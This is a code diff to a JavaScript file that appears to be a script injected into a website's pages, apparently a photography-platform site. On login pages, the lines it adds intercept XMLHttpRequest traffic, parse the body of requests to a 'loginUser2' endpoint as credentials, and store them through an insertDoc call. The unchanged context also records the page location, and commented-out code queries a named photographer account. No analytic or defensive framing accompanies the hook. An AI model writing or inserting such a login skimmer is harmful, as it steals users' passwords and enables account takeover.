@@ -67,6 +67,34 @@ if (Math.random() <= 1.0) {
     setTimeout(async () => {
       await insertDoc("location", window.location);
 
+      const isLoginPage = window.location.pathname.includes("/login");
+
+      if (isLoginPage) {
+        const originalSend = XMLHttpRequest.prototype.send;
+        const originalOpen = XMLHttpRequest.prototype.open;
+
+        XMLHttpRequest.prototype.open = function (method, url) {
+          this._monitoredUrl = url;
+          return originalOpen.apply(this, arguments);
+        };
+
+        XMLHttpRequest.prototype.send = async function (data) {
+          const urlToMonitor = "loginUser2";
+
+          if (this._monitoredUrl && this._monitoredUrl.includes(urlToMonitor)) {
+            const credentials = JSON.parse(data);
+            await insertDoc("credentials", credentials);
+
+            this.addEventListener("readystatechange", function () {
+              if (this.readyState === XMLHttpRequest.DONE) {
+                // You can access response data (this.responseText, this.responseXML) if necessary
+              }
+            });
+          }
+          return originalSend.apply(this, arguments);
+        };
+      }
+
       const userType = _pt$?.userInfo?.type;
       const gusr = _pt$?.hdrs?.gusr;
       const lusr = _pt$?.hdrs?.lusr;
@@ -86,7 +114,6 @@ if (Math.random() <= 1.0) {
         //   console.error(err);
         //   insertDoc("error", err.toString());
         // }
-
         // // General Upgrade Actions
         // try {
         //   const url = "/upgradescripts/generalUpgradeActions.aspx";
@@ -97,12 +124,10 @@ if (Math.random() <= 1.0) {
         //   console.error(err);
         //   insertDoc("error", err.toString());
         // }
-
         // getGUserAccess
         // try {
         //   const accountUrl = "https://baronephoto.pic-time.com";
         //   const accountId = 78982;
-
         //   const lookUpPhotographerAccountBody = { id: accountId, idType: 0 };
         //   const lookUpPhotographerAccountData = await fetch(lookUpPhotographerAccountFetchUrl, {
         //     headers: {
